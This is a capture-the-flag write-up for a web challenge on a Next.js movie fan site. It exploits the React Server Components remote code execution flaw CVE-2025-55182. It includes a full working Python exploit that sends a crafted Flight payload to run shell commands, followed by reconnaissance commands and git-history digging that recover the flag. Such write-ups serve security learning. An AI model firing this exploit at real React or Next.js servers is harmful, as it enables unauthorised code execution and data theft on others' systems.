 # The Cursed Archive  - BYPASS CTF 

## Challenge Information
| Field | Value |
|-------|-------|
| **CTF** | BYPASS CTF |
| **Category** | Web |
| **Difficulty** | Expert|
| **Points** | 500 |
| **Challenge Link** | http://20.196.144.202:3000/ |

---


## Challenge Description

> We stumbled upon a strange fan site hosting a collection of Pirates of the Caribbean movies. It looks like a simple static gallery, but our scanners picked up strange energy signatures coming from the server. Do React.

---

## Technical Overview

This challenge exploits **CVE-2025-55182**, also known as **React2Shell**, a critical (CVSS 10.0) pre-authentication Remote Code Execution (RCE) vulnerability affecting React Server Components (RSC). The vulnerability exists in React's Flight protocol, which handles serialization and deserialization of data between client and server in modern React applications using Server Functions.

The challenge presents a Next.js-based Pirates of the Caribbean movie gallery. While the frontend appears to be a simple static page, the underlying Next.js server is vulnerable to React2Shell, allowing unauthenticated attackers to execute arbitrary commands on the server.

The flag is split into three parts, hidden across different locations:
- **Part 1 (P1):** Whitespace-encoded in a `flag.txt` file
- **Part 2 (P2):** Referenced via a Pastebin link found in Git history
- **Part 3 (P3):** Hidden in a Git branch comment

---

## Step-by-Step Solution

### Step 1: Initial Reconnaissance

First, we examine the target website at `http://20.196.144.202:3000/`:

```bash
curl -s "http://20.196.144.202:3000/" | head -50
```

**Key observations from the HTML source:**

```html
<!DOCTYPE html><!--EYiomz8ooKwCJqjZJtHlZ--><html lang="en">
<head>
    <meta charSet="utf-8"/>
    <link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/fd5f064b2a3f9309.js"/>
    <!-- ... Next.js specific scripts ... -->
</head>
```

The presence of `/_next/static/chunks/` paths confirms this is a **Next.js application**.

### Step 2: Identifying the Vulnerability

The challenge hint "Do React" combined with the Next.js framework suggests we should look for React-related vulnerabilities. Given the timing (late 2025), **CVE-2025-55182 (React2Shell)** is a prime candidate.

Examining the JavaScript chunks reveals React Server Components patterns:

```bash
curl -s "http://20.196.144.202:3000/_next/static/chunks/00cf833092be8521.js" | grep -oE 'shell|hidden'
```

Output:
```
hidden
shell
hidden
shell
```

This confirms suspicious elements in the code, hinting at the challenge's theme.

### Step 3: Creating the Exploit

We create a Python exploit based on the publicly available PoC for CVE-2025-55182:

**poc.py:**
```python
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://20.196.144.202:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(f"Status: {res.status_code}")
print(f"Response: {res.text}")
```

**Key aspects of this exploit:**

1. **Error Exfiltration Technique:** The payload throws a `NEXT_REDIRECT` error with the command output in the `digest` field. This clever technique returns command output to the attacker.

2. **Next-Action Header:** Setting `Next-Action: x` triggers the vulnerable code path during deserialization, before any action validation occurs.

3. **reason: -1:** This prevents a crash from `toString()` invocation in `initializeModelChunk`.

### Step 4: Confirming RCE

```bash
python3 poc.py "http://20.196.144.202:3000" "id"
```

**Output:**
```
Status: 500
Response: 0:{"a":"$@1","f":"","b":"EYiomz8ooKwCJqjZJtHlZ"}
1:E{"digest":"uid=1001(appuser) gid=1001 groups=1001"}
```

**RCE confirmed!** The server executed `id` and returned `uid=1001(appuser)`.

### Step 5: Exploring the File System

```bash
python3 poc.py "http://20.196.144.202:3000" "ls -la /app"
```

**Output:**
```
Status: 500
Response: 0:{"a":"$@1","f":"","b":"EYiomz8ooKwCJqjZJtHlZ"}
1:E{"digest":"total 60
dr-xr-xr-x    1 root     root          4096 Dec 28 12:53 .
drwxr-xr-x    1 root     root          4096 Dec 28 15:42 ..
dr-xr-xr-x    1 appuser  appgroup      4096 Dec 27 03:54 .git
dr-xr-xr-x    1 appuser  appgroup      4096 Dec 27 07:45 .next
-r--r--r--    1 appuser  appgroup       663 Dec 26 22:19 flag.txt
dr-xr-xr-x    1 appuser  appgroup      4096 Dec 27 07:45 node_modules
-r--r--r--    1 appuser  appgroup     31639 Dec 26 22:15 package-lock.json
-r--r--r--    1 appuser  appgroup       417 Dec 26 22:15 package.json"}
```

Key findings:
- **flag.txt** exists in `/app`
- **.git** directory is present (version control history!)

### Step 6: Finding Flag Part 1 (P1)

```bash
python3 poc.py "http://20.196.144.202:3000" "cat /app/flag.txt | base64"
```

**Output:**
```
1:E{"digest":"ICAgCSAJICAgIAoJCiAgICAgIAkJICAgCQoJCiAgICAgIAkJCSAJIAoJCi..."}
```

The flag.txt contains **Whitespace-encoded** data (spaces and tabs). Decoding it:

**Whitespace Decoder:**
```python
import base64

data = "ICAgCSAJICAgIAoJCiAgICAgIAkJICAgCQoJCi..."  # Full base64 string

decoded = base64.b64decode(data).decode('utf-8')

# Split by \n\t\n delimiter
lines = decoded.split('\n\t\n')

result = []
for line in lines:
    line = line.strip('\n')
    if not line:
        continue
    # Convert: space=0, tab=1
    binary = ''
    for c in line:
        if c == ' ':
            binary += '0'
        elif c == '\t':
            binary += '1'
    
    if binary:
        val = int(binary, 2)
        if 32 <= val <= 126:
            result.append(chr(val))

print(''.join(result))
```

**Decoded Output:**
```
P1: BYPASS_CTF{R34ctchecking vc might help
```

**Flag Part 1:** `BYPASS_CTF{R34ct`

The message also hints: "checking vc might help" - suggesting we should check **version control (Git)**.

### Step 7: Investigating Git History

```bash
python3 poc.py "http://20.196.144.202:3000" "cd /app && git log --all --oneline --source"
```

**Output:**
```
1:E{"digest":"173acd3	refs/heads/main files
fe0a7f7	refs/heads/main files
9bca028	refs/heads/main final
a52086a	refs/heads/main files
4c37e39	refs/heads/check check
6b71d2c	refs/heads/main docker
510b5ba	refs/heads/main files
4f2a9d4	refs/heads/main files
ca84d7b	refs/heads/main config files
ddf8bd5	refs/heads/main tsconfig
d37019d	refs/heads/main initial commit"}
```

**Important discovery:** There's a branch called **"check"** with commit `4c37e39`!

### Step 8: Finding Flag Part 3 (P3)

```bash
python3 poc.py "http://20.196.144.202:3000" "cd /app && git show 4c37e39"
```

**Output:**
```
1:E{"digest":"commit 4c37e390b597e9c26bdd45a08b3f1b9c5c882657
Author: J R Deva Dattan <jrdevadattan2006@gmail.com>
Date:   Wed Dec 24 22:33:00 2025 +0530

    check

diff --git a/Dockerfile b/Dockerfile
index dc2a2de..c7474e5 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,4 +1,4 @@
-# Use a lightweight Node.js image
+#P3: Acc3ss}
 FROM node:22-alpine
..."}
```

**Flag Part 3:** `Acc3ss}`

### Step 9: Finding Flag Part 2 (P2)

Examining the "docker" commit for deleted files:

```bash
python3 poc.py "http://20.196.144.202:3000" "cd /app && git show 6b71d2c"
```

**Output (truncated):**
```
1:E{"digest":"commit 6b71d2ca641081d7c59034b26303d2d073a209bf
...
diff --git a/app/.env b/app/.env
deleted file mode 100644
index eb957da..0000000
--- a/app/.env
+++ /dev/null
@@ -1 +0,0 @@
-https://pastebin.com/D7V0Urjh"}
```

A **Pastebin link** was found in a deleted `.env` file!

Visiting `https://pastebin.com/D7V0Urjh`:

```
P2: _2she111_
```

**Flag Part 2:** `_2she111_`

### Step 10: Assembling the Flag

Combining all three parts:

| Part | Value | Location |
|------|-------|----------|
| P1 | `BYPASS_CTF{R34ct` | Whitespace-encoded flag.txt |
| P2 | `_2she111_` | Pastebin link from deleted .env |
| P3 | `Acc3ss}` | Git "check" branch Dockerfile comment |

---

## Flag

`BYPASS_CTF{R34ct_2she111_Acc3ss}`

 pwn by **W4RR1OR**